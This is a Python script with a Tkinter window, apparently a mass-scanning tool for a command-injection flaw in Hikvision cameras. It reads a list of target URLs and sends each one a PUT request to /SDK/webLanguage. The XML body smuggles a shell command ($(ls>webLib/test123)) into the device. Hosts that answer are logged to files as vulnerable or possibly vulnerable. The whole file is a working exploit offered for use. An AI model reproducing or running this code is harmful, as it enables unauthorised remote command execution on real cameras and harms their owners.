from concurrent.futures import ThreadPoolExecutor
import requests
import tkinter as tk
from tkinter import scrolledtext
from ttkbootstrap.constants import *
def hkv_rce():
    with open("修正后的url.txt","r") as f:
        for address in f.readlines():
            try:
                address = address.strip()
                url = address + "/SDK/webLanguage"
                newurl = url.split('//')[1].split('/')[0]
                if ":" not in str(newurl):
                    pass
                else:
                    host = newurl.split(':')[0]
                    port = newurl.split(':')[1]
                    hkv_text.insert(END, chars="【~~~】开始扫描url：" + url + "\n")
                    hkv_text.see(END)
                    headers = {
                        "host": f'{host}:{port}',
                        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36",
                        'Accept': '*/*',
                        'X-Requested-With': 'XMLHttpRequest',
                        'Accept-Encoding': 'gzip, deflate',
                        'Accept-Language': 'en-US,en;q=0.9,sv;q=0.8'
                    }
                    data = r"""<?xml version="1.0" encoding="UTF-8"?><language>$(ls>webLib/test123)</language>"""
                    resp = requests.put(url,headers=headers,data=data,timeout=3)
                    # hkv_text.insert(END, chars="-"*50 + "\n" + resp.text + "-"*50 + "\n")
                    # hkv_text.see(END)
                    if resp.status_code == 200:
                        hkv_text.insert(END, chars="【O(∩_∩)O】存在漏洞并且可以执行！存在漏洞的url为：" + url + "\n")
                        hkv_text.see(END)
                        with open("存在海康威视RCE漏洞的url.txt","a+") as m:
                            m.write(url + "\n")
                    elif resp.status_code == 401:
                        hkv_text.insert(END, chars="【×××】不存在漏洞！url为：" + url + "\n")
                        hkv_text.see(END)
                    else:
                        hkv_text.insert(END, chars="【×××】可能存在漏洞！url为：" + url + "\n")
                        hkv_text.see(END)
                        with open("可能存在海康威视RCE漏洞的url.txt","a+") as m:
                            m.write(url + "\n")
            except Exception as e:
                hkv_text.insert(END, chars=str(e) + "\n")
                hkv_text.see(END)
        hkv_text.insert(END, chars="【###】检测完毕！" + "\n")
        hkv_text.see(END)

def hkv_rce_gui():
    hkv_gui = tk.Tk()
    hkv_gui.geometry("900x450")
    hkv_gui.title("海康威视RCE一把梭")
    hkv_gui.resizable(0, 0)
    hkv_gui.iconbitmap('logo.ico')
    global hkv_text
    hkv_text = scrolledtext.ScrolledText(hkv_gui,width=119, height=24)
    hkv_text.grid(row=4, columnspan=3, padx=20, pady=10)
    hkv_text.see(END)
    # 最大线程数
    max_thread_num = 100
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    future = executor.submit(hkv_rce)
    hkv_gui.mainloop()